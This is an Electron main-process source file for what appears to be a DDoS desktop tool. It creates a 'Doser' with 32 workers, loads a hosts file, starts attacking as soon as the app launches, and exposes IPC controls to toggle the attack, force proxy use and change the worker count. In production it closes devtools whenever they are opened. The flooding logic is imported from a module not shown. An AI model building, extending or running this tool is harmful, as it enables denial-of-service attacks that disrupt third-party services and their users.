import { app, BrowserWindow, nativeTheme, ipcMain } from 'electron'
import path from 'path'
import os from 'os'

import { Doser } from '../src-worker/doser'

// needed in case process is undefined under Linux
const platform = process.platform || os.platform()

try {
  if (platform === 'win32' && nativeTheme.shouldUseDarkColors === true) {
    require('fs').unlinkSync(path.join(app.getPath('userData'), 'DevTools Extensions'))
  }
} catch (_) { }

let mainWindow

function createWindow () {
  /**
   * Initial window options
   */
  mainWindow = new BrowserWindow({
    icon: path.resolve(__dirname, 'icons/icon.png'), // tray icon
    width: 600,
    height: 900,
    useContentSize: true,
    webPreferences: {
      contextIsolation: false,
      // More info: /quasar-cli/developing-electron-apps/electron-preload-script
      nodeIntegration: true,
      nodeIntegrationInWorker: true
    }
  })

  mainWindow.setMenu(null)
  mainWindow.loadURL(process.env.APP_URL)

  if (process.env.DEBUGGING) {
    // if on DEV or Production with debug enabled
    mainWindow.webContents.openDevTools()
  } else {
    // we're on production; no access to devtools pls
    mainWindow.webContents.on('devtools-opened', () => {
      mainWindow.webContents.closeDevTools()
    })
  }

  mainWindow.on('closed', () => {
    mainWindow = null
  })

  const doser = new Doser(true, 32)
  const window = mainWindow
  doser.listen('atack', (data) => console.log(data.log))
  doser.listen('atack', (data) => window.webContents.send('atack', data))
  doser.listen('error', (data) => window.webContents.send('error', data))
  doser.loadHostsFile().then(() => {
    doser.start()
  }).catch(() => {
    app.quit()
  })

  ipcMain.on('updateDDOSEnable', (event, arg) => {
    if (arg.newVal) {
      doser.start()
    } else {
      doser.stop()
    }
  })

  ipcMain.on('updateForceProxy', (event, arg) => {
    doser.forceProxy(arg.newVal)
  })

  ipcMain.on('updateMaxDosersCount', (event, arg) => {
    doser.setWorkersCount(arg.newVal)
  })
}

app.whenReady().then(createWindow)

app.on('window-all-closed', () => {
  if (platform !== 'darwin') {
    app.quit()
  }
})

app.on('activate', () => {
  if (mainWindow === null) {
    createWindow()
  }
})
